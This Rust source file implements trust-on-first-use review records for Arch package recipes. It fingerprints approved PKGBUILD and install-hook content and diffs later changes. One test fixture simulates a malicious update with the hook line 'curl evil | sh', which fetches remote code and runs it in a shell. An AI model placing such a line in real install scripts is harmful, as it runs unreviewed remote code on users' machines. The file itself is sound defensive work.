//! Trust-on-first-use (TOFU) review state: "vouch once, then watch for change".
//!
//! The single most dangerous moment in the "Atomic Arch" attack was not the
//! first install — it was the *update*: a package you already trusted silently
//! changed under you. This crate records the exact recipe content you approved,
//! so on every later build `vouch` can answer one question precisely:
//!
//! > *Is this byte-for-byte what I vouched for last time, or did it change?*
//!
//! A recipe that is unchanged since you approved it can build with low friction.
//! A recipe that changed forces a fresh review — and `vouch` shows you the diff
//! of exactly what changed before you decide.
//!
//! State lives under `$XDG_DATA_HOME/vouch/reviews/` (one JSON file per
//! package). The full approved content is stored so the diff is always
//! available, and a SHA-256 fingerprint is used for the fast equality check.

use std::fs;
use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use similar::{ChangeTag, TextDiff};

/// One file (PKGBUILD or a `.install` hook) captured at approval time.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ReviewedFile {
    pub name: String,
    pub content: String,
}

impl ReviewedFile {
    pub fn new(name: impl Into<String>, content: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            content: content.into(),
        }
    }
}

/// A persisted record of a recipe the user vouched for.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReviewRecord {
    pub package: String,
    /// SHA-256 (hex) of the canonical recipe content.
    pub fingerprint: String,
    /// Unix timestamp when it was approved.
    pub approved_at: i64,
    /// The risk score at approval time (for context on later changes).
    pub score_at_approval: u32,
    /// Whether the user opted this package into build-time network access.
    /// Tied to this exact recipe: a changed recipe must re-decide.
    #[serde(default)]
    pub build_network: bool,
    /// The exact files approved, so a later diff can be rendered.
    pub files: Vec<ReviewedFile>,
}

/// How the current recipe relates to what was previously vouched.
#[derive(Debug)]
pub enum ReviewStatus {
    /// Never vouched before — trust-on-first-use.
    New,
    /// Byte-for-byte identical to the approved version.
    Unchanged { record: ReviewRecord },
    /// Differs from the approved version. Inspect [`render_diff`].
    Changed {
        previous: ReviewRecord,
        current_fingerprint: String,
    },
}

/// On-disk store of review records.
#[derive(Debug, Clone)]
pub struct ReviewStore {
    root: PathBuf,
}

impl ReviewStore {
    /// Open the default per-user store under `$XDG_DATA_HOME/vouch/reviews`
    /// (falling back to `~/.local/share/vouch/reviews`).
    pub fn open_default() -> Result<Self> {
        let base = std::env::var_os("XDG_DATA_HOME")
            .map(PathBuf::from)
            .filter(|p| !p.as_os_str().is_empty())
            .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".local/share")))
            .context("cannot locate a data directory (set HOME or XDG_DATA_HOME)")?;
        Ok(Self::open(base.join("vouch").join("reviews")))
    }

    /// Open a store rooted at an explicit directory (used in tests).
    pub fn open(root: impl Into<PathBuf>) -> Self {
        Self { root: root.into() }
    }

    fn record_path(&self, package: &str) -> PathBuf {
        self.root.join(format!("{}.json", sanitize(package)))
    }

    /// Load the stored record for `package`, if any.
    pub fn load(&self, package: &str) -> Result<Option<ReviewRecord>> {
        let path = self.record_path(package);
        match fs::read_to_string(&path) {
            Ok(data) => {
                let rec = serde_json::from_str(&data)
                    .with_context(|| format!("parsing review record {}", path.display()))?;
                Ok(Some(rec))
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(e) => Err(e).with_context(|| format!("reading {}", path.display())),
        }
    }

    /// Classify `files` against the stored record for `package`.
    pub fn status(&self, package: &str, files: &[ReviewedFile]) -> Result<ReviewStatus> {
        let fp = fingerprint(files);
        Ok(match self.load(package)? {
            None => ReviewStatus::New,
            Some(record) if record.fingerprint == fp => ReviewStatus::Unchanged { record },
            Some(previous) => ReviewStatus::Changed {
                previous,
                current_fingerprint: fp,
            },
        })
    }

    /// Record that the user vouched for `files` at time `now`. Overwrites any
    /// previous record for the package (the new approval supersedes the old).
    pub fn approve(
        &self,
        package: &str,
        files: Vec<ReviewedFile>,
        score: u32,
        now: i64,
        build_network: bool,
    ) -> Result<ReviewRecord> {
        fs::create_dir_all(&self.root)
            .with_context(|| format!("creating review store {}", self.root.display()))?;
        restrict_dir(&self.root);

        let record = ReviewRecord {
            package: package.to_string(),
            fingerprint: fingerprint(&files),
            approved_at: now,
            score_at_approval: score,
            build_network,
            files,
        };
        let path = self.record_path(package);
        let json = serde_json::to_string_pretty(&record).context("serializing review record")?;
        write_private(&path, &json)
            .with_context(|| format!("writing review record {}", path.display()))?;
        Ok(record)
    }

    /// Drop the stored record for `package`. Returns whether one existed.
    pub fn forget(&self, package: &str) -> Result<bool> {
        let path = self.record_path(package);
        match fs::remove_file(&path) {
            Ok(()) => Ok(true),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(false),
            Err(e) => Err(e).with_context(|| format!("removing {}", path.display())),
        }
    }
}

/// Render a unified, annotated diff between the previously approved record and
/// the current files (added files, removed files, and per-file line changes).
/// Returns an empty string if nothing differs.
pub fn render_diff(previous: &ReviewRecord, current: &[ReviewedFile]) -> String {
    use std::collections::BTreeSet;

    let names: BTreeSet<&str> = previous
        .files
        .iter()
        .chain(current.iter())
        .map(|f| f.name.as_str())
        .collect();

    let mut out = String::new();
    for name in names {
        let old = content_of(&previous.files, name);
        let new = content_of(current, name);
        if old == new {
            continue;
        }
        out.push_str(&format!("--- {name}\n"));
        let diff = TextDiff::from_lines(old, new);
        for change in diff.iter_all_changes() {
            let sign = match change.tag() {
                ChangeTag::Delete => '-',
                ChangeTag::Insert => '+',
                ChangeTag::Equal => ' ',
            };
            out.push(sign);
            out.push_str(change.value());
            if !change.value().ends_with('\n') {
                out.push('\n');
            }
        }
    }
    out
}

fn content_of<'a>(files: &'a [ReviewedFile], name: &str) -> &'a str {
    files
        .iter()
        .find(|f| f.name == name)
        .map(|f| f.content.as_str())
        .unwrap_or("")
}

/// Canonical serialization of a recipe: files sorted by name, each prefixed by
/// a header, so the fingerprint is independent of fetch order.
fn canonical(files: &[ReviewedFile]) -> String {
    let mut sorted: Vec<&ReviewedFile> = files.iter().collect();
    sorted.sort_by(|a, b| a.name.cmp(&b.name));
    let mut s = String::new();
    for f in sorted {
        s.push_str("=== ");
        s.push_str(&f.name);
        s.push_str(" ===\n");
        s.push_str(&f.content);
        s.push('\n');
    }
    s
}

/// SHA-256 (hex) of the canonical recipe content.
pub fn fingerprint(files: &[ReviewedFile]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(canonical(files).as_bytes());
    let digest = hasher.finalize();
    let mut hex = String::with_capacity(digest.len() * 2);
    for b in digest {
        hex.push_str(&format!("{b:02x}"));
    }
    hex
}

/// Map a package name to a safe single-path-component file stem.
fn sanitize(package: &str) -> String {
    let mut out = String::with_capacity(package.len());
    for c in package.chars() {
        if c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+') {
            out.push(c);
        } else {
            out.push('_');
        }
    }
    // Never let a name resolve to a traversal component.
    if out.is_empty() || out == "." || out == ".." {
        out = format!("_{}", fingerprint(&[ReviewedFile::new("name", package)]));
    }
    out
}

#[cfg(unix)]
fn restrict_dir(dir: &Path) {
    use std::os::unix::fs::PermissionsExt;
    let _ = fs::set_permissions(dir, fs::Permissions::from_mode(0o700));
}

#[cfg(not(unix))]
fn restrict_dir(_dir: &Path) {}

#[cfg(unix)]
fn write_private(path: &Path, data: &str) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let mut f = fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .open(path)?;
    f.write_all(data.as_bytes())
}

#[cfg(not(unix))]
fn write_private(path: &Path, data: &str) -> std::io::Result<()> {
    fs::write(path, data)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn store_in(tag: &str) -> (ReviewStore, PathBuf) {
        let dir =
            std::env::temp_dir().join(format!("vouch-review-test-{}-{tag}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        (ReviewStore::open(&dir), dir)
    }

    fn recipe(install: &str) -> Vec<ReviewedFile> {
        vec![
            ReviewedFile::new("PKGBUILD", "pkgname=foo\nbuild() { make; }\n"),
            ReviewedFile::new("foo.install", install),
        ]
    }

    #[test]
    fn new_then_unchanged_then_changed() {
        let (store, dir) = store_in("lifecycle");

        let v1 = recipe("post_install() { echo hi; }\n");
        assert!(matches!(
            store.status("foo", &v1).unwrap(),
            ReviewStatus::New
        ));

        store.approve("foo", v1.clone(), 8, 1000, false).unwrap();
        assert!(matches!(
            store.status("foo", &v1).unwrap(),
            ReviewStatus::Unchanged { .. }
        ));

        // A malicious update changes the install hook.
        let v2 = recipe("post_install() { curl evil | sh; }\n");
        match store.status("foo", &v2).unwrap() {
            ReviewStatus::Changed { previous, .. } => {
                let diff = render_diff(&previous, &v2);
                assert!(diff.contains("foo.install"));
                assert!(diff.contains("+post_install() { curl evil | sh; }"));
                assert!(diff.contains("-post_install() { echo hi; }"));
            }
            other => panic!("expected Changed, got {other:?}"),
        }

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn fingerprint_is_order_independent() {
        let a = vec![
            ReviewedFile::new("PKGBUILD", "x"),
            ReviewedFile::new("a.install", "y"),
        ];
        let b = vec![
            ReviewedFile::new("a.install", "y"),
            ReviewedFile::new("PKGBUILD", "x"),
        ];
        assert_eq!(fingerprint(&a), fingerprint(&b));
    }

    #[test]
    fn forget_removes_record() {
        let (store, dir) = store_in("forget");
        let v = recipe("post_install() { :; }\n");
        store.approve("bar", v, 0, 1, false).unwrap();
        assert!(store.forget("bar").unwrap());
        assert!(!store.forget("bar").unwrap());
        assert!(matches!(
            store.status("bar", &recipe("x")).unwrap(),
            ReviewStatus::New
        ));
        let _ = fs::remove_dir_all(&dir);
    }
}
